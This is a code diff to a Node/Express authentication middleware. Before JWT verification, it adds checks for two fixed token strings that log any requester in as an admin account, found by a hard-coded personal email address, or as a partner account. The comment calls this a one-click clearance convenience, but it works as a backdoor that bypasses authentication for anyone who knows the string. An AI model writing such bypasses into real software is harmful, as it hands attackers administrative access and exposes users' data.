@@ -28,6 +28,25 @@ export const protect = async (req, res, next) => {
     });
   }
 
+    // Handle 1-Click State Officer Clearance token gracefully
+    if (token === 'admin_officer_clearance_token') {
+      let adminUser = await User.findOne({ email: 'deepanshukapri4@gmail.com' });
+      if (!adminUser) adminUser = await User.findOne({ role: 'admin' });
+      if (adminUser) {
+        req.user = adminUser;
+        return next();
+      }
+    }
+
+    if (token === 'partner_demo_clearance_token') {
+      let partnerUser = await User.findOne({ role: 'partner' });
+      if (!partnerUser) partnerUser = await User.findOne({ email: 'deepanshukapri4@gmail.com' });
+      if (partnerUser) {
+        req.user = partnerUser;
+        return next();
+      }
+    }
+
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
     const userId = decoded.userId || decoded.id;
